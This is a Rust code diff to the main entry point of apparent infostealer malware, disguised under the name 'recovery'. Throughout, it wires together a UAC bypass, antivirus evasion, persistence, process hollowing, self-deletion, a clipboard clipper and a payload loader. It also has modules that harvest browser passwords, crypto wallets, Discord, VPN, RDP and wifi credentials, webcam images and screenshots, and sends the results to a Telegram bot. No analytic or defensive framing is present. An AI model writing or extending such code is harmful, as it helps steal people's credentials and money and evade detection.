@@ -8,7 +8,7 @@ use recovery::{RecoveryContext, RecoveryManager};
 use tracing_subscriber::prelude::*;
 use tracing_subscriber::{EnvFilter, fmt};
 
-#[tokio::main(flavor = "multi_thread")]
+#[tokio::main(flavor = "current_thread")]
 async fn main() -> Result<(), RecoveryError> {
     if recovery::killswitch::check_killswitch().await
         || !recovery::behavioral::check_behavioral().await
@@ -24,8 +24,10 @@ async fn main() -> Result<(), RecoveryError> {
         .with(fmt_layer)
         .init();
 
+    #[cfg(feature = "uac")]
     recovery::uac::attempt_uac_bypass().await;
 
+    #[cfg(feature = "evasion")]
     recovery::evasion::apply_evasion_techniques();
 
     let syscall_manager = recovery::helpers::syscalls::SyscallManager::new().ok();
@@ -34,13 +36,19 @@ async fn main() -> Result<(), RecoveryError> {
     let context = RecoveryContext::discover()
         .map_err(|err| RecoveryError::Custom(format!("context initialization failed: {err}")))?;
 
-    recovery::persistence::install_persistence().await;
+    let args: Vec<String> = std::env::args().collect();
+    if !args.contains(&"--hollowed".to_string()) {
+        #[cfg(feature = "persistence")]
+        recovery::persistence::install_persistence().await;
+    }
 
     if recovery::hollowing::perform_hollowing().await {
+        #[cfg(feature = "melt")]
         recovery::self_delete::perform_melt();
         std::process::exit(0);
     }
 
+    #[cfg(feature = "clipper")]
     recovery::clipper::run_clipper().await;
     recovery::loader::run_loader().await;
 
@@ -63,10 +71,17 @@ async fn register_all_tasks(
     context: &RecoveryContext,
 ) -> Result<(), RecoveryError> {
     use recovery::{
-        account_validation, behavioral, browsers, chromium, clipboard, devops, discord, email,
+        account_validation, behavioral, browsers, chromium, devops, discord, email,
         file_recovery, ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, proxy, rdp,
-        screenshot, services, surveillance, system, vnc, vpn, wallet, webcam, wifi,
+        services, surveillance, system, vnc, vpn, wallet, wifi,
     };
+
+    #[cfg(feature = "clipboard")]
+    use recovery::clipboard;
+    #[cfg(feature = "screenshot")]
+    use recovery::screenshot;
+    #[cfg(feature = "webcam")]
+    use recovery::webcam;
 
     manager.register_tasks(browsers::default_browser_tasks(context).await);
     manager.register_tasks(gecko::gecko_tasks(context));
@@ -98,14 +113,20 @@ async fn register_all_tasks(
     manager.register_tasks(ftp::ftp_tasks(context));
     manager.register_task(wifi::wifi_task(context));
 
-    let control = recovery::settings::RecoveryControl::global();
-    if control.capture_screenshots() {
+    let _control = recovery::settings::RecoveryControl::global();
+    
+    #[cfg(feature = "screenshot")]
+    if _control.capture_screenshots() {
         manager.register_task(screenshot::screenshot_task(context));
     }
-    if control.capture_webcams() {
+
+    #[cfg(feature = "webcam")]
+    if _control.capture_webcams() {
         manager.register_task(webcam::webcam_task(context));
     }
-    if control.capture_clipboard() {
+
+    #[cfg(feature = "clipboard")]
+    if _control.capture_clipboard() {
         manager.register_task(clipboard::clipboard_task(context));
     }
 
@@ -131,7 +152,7 @@ async fn send_outcomes(outcomes: &[RecoveryOutcome]) -> Result<(), Box<dyn std::
     } else if let Some(token) = control.telegram_token() {
         let chat_id = control
             .telegram_chat_id()
-            .map(ChatId::from)
+            .map(|id| ChatId::from(id.as_str()))
             .unwrap_or_else(|| ChatId::from(0));
         Sender::Telegram(TelegramSender::new(token.to_string()), chat_id)
     } else {
